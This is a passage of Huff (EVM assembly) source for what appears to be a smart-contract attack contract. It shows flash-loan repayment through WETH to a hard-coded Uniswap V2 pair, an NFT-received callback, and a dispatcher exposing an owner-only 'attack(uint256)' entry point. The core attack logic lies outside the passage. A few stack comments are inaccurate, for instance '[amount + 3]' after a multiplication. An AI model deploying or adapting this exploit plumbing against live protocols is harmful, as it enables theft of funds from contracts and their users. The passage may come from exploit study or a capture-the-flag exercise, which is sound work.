    0x3e5             // [0x3e5, 0x01, amount, weth, pair] - 997 in decimal
    0x03              // [0x03, 0x3e5, 0x01, amount, weth, pair]
    dup4              // [amount, 0x03, 0x3e5, 0x01, amount, weth, pair]
    mul               // [[amount + 3], 0x3e5, 0x01, amount, weth, pair]
    div               // [[(amount + 3) / 997], 0x01, amount, weth, pair]
    add               // [[(amount + 3) / 997 + 1], amount, weth, pair]
    add               // [repay, weth, pair]

    // CALL into weth (wrap ether)
    0x00              // [0x00, repay, weth, pair]
    dup1              // [0x00, 0x00, repay, weth, pair]
    dup1              // [0x00, 0x00, 0x00, repay, weth, pair]
    dup1              // [0x00, 0x00, 0x00, 0x00, repay, weth, pair]
    dup5              // [repay, 0x00, 0x00, 0x00, 0x00, repay, weth, pair]
    dup7              // [weth, repay, 0x00, 0x00, 0x00, 0x00, repay, weth, pair]
    gas               // [gas, weth, repay, 0x00, 0x00, 0x00, 0x00, repay, weth, pair]
    call              // [success, repay, weth, pair]
    iszero            // [0/1, repay, weth, pair]
    throw_error       // [throw_error, 0/1, repay, weth, pair]
    jumpi             // [repay, weth, pair]

    // Copy `transfer(address,uint256)` func sig and params into mem to use as calldata for CALL
    0xa9059cbb        // [0xa9059cbb, repay, weth, pair] - func sig
    0x00              // [0x00, 0xa9059cbb, repay, weth, pair] - byte offest in mem
    mstore            // [repay, weth, pair] - copied func sig into mem at offset 0x00

    0x40              // [0x40, repay, weth, pair] - byte offset in mem
    mstore            // [weth, pair] - copied repay into mem at offset 0x40

    swap1             // [pair, weth]
    0x20              // [0x20, pair, weth]
    mstore            // [weth] - copied pair into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000a9059cbb -> `transfer(address,uint256)` func sig
    // [OFFSET 0x20]   0000000000000000000000002Aa3DB64D4245077181DFb9d7c20fa823F044FD0 -> pair address
    // [OFFSET 0x40]   000000000000000000000000000000000000000000000000d0cb0ef07d50b8e0 -> repay (uint256) 
    // ...
    
    // CALL into weth (send loan amount back to pair)
    0x00              // [0x00, weth]
    dup1              // [0x00, 0x00, weth]
    0x44              // [0x44, 0x00, 0x00, weth]
    0x1c              // [0x1c, 0x44, 0x00, 0x00, weth]
    dup3              // [0x00, 0x1c, 0x44, 0x00, 0x00, weth]
    dup6              // [weth, 0x00, 0x1c, 0x44, 0x00, 0x00, weth]
    gas               // [gas, weth, 0x00, 0x1c, 0x44, 0x00, 0x00, weth]
    call              // [success, weth]
    iszero            // [0/1, weth]
    throw_error       // [throw_error, 0/1, weth]
    jumpi             // [weth]
    pop               // []

    stop
}

// NFT received callback function
#define macro ERC721_CALLBACK() = takes(1) returns (0) {
    // takes: [func_sig]
    
    // Verify caller is nft contract
    [NFT_SLOT]       // [0x05, func_sig] - storage slot where nft is
    sload            // [nft, func_sig] - copied nft onto stack from storage slot 0x05
    caller           // [caller, nft, func_sig] - msg.sender
    xor              // [xor_value, func_sig] - pushes 0 if items are equal
    throw_error      // [throw_error, xor_value, func_sig]
    jumpi            // [func_sig]

    // Return onERC721Received function selector
    0xe0             // [0xe0, func_sig] - # of bits to shift by
    shl              // [func_sig_] - shifted func_sig 224 bits to the left (converted it to bytes8)
    msize            // [0x00, func_sig_] - byte offset in mem
    mstore           // [] - copied first 32 bytes of calldata into mem at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]  150b7a0200000000000000000000000000000000000000000000000000000000 -> `onERC721Received` func sig

    msize            // [0x20] - size of return data
    0x00             // [0x00, 0x20] - byte offset in mem where return data starts
    return           // [] - return `onERC721Received` func sig
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00            // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload    // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0            // [0xe0, calldata] - 0xe0 is 224 bits
    shr             // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                    // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1            // [func_sig, func_sig]
    0x64dd891a      // [0x64dd891a, func_sig, func_sig] - pushing func sig of 'attack(uint256)' onto the stack
    eq              // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack          // [attack, 0/1, func_sig] - attack is a label (byte offset) for the attack instructions in the code
    jumpi           // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1            // [func_sig, func_sig]
    0x10d1e85c      // [0x10d1e85c, func_sig, func_sig] - pushing func sig of 'uniswapV2Call' onto the stack
    eq              // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    uni_callback    // [uni_callback, 0/1, func_sig] - uni_callback is a label (byte offset) for the uniswap callback instructions in the code
    jumpi           // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1            // [func_sig, func_sig]
    0x150b7a02      // [0x150b7a02, func_sig, func_sig] - pushing func sig of 'onERC721Received' onto the stack
    eq              // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    erc721_callback // [721_callback, 0/1, func_sig] - 721_callback is a label (byte offset) for the onERC721Received callback instructions in the code
    jumpi           // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
    
    // Fallback
    callvalue    // [msg.value]
    iszero       // [0/1]
    throw_error  // [throw_error, 0/1]
    jumpi        // [] - will revert if msg.value is 0, else will return
    0x00         // [0x00] - size of return data
    0x00         // [0x00, 0x00] - byte offset in mem where return data starts
    return       // [] - return wit no data

    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        0x04
        calldataload // [borrow_amt]
        ATTACK()

    uni_callback:    // label for flash loan callback instructions
        0x04
        calldataload  // [sender]
        0x24
        calldataload  // [amount, sender]
        // 0x44 is token
        // 0x64 is bytes param offset
        // 0x84 is bytes param length
        0xa4
        calldataload  // [pair, amount, sender]
        UNI_CALLBACK() 

    erc721_callback:
        ERC721_CALLBACK() // [func_sig]
}
